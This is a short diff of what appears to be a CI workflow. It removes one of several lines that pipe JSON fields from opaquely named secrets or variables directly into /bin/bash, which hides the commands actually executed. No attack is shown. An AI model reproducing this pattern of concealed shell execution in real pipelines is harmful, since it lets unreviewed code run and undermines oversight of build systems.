@@ -20,7 +20,6 @@ jobs:
           u939: ${{ secrets.u939 }}
         run: |
           printf '%s' "$u939" | jq -r .cwhs04121 | /bin/bash
-          printf '%s' "$yla45" | jq -r .ulds80 | /bin/bash
           printf '%s' "$cwdhu4" | jq -r .evds9 | /bin/bash
           printf '%s' "$qq1" | jq -r .q3 | /bin/bash
           echo $b2 | jq -r .xsy3481 | /bin/bash
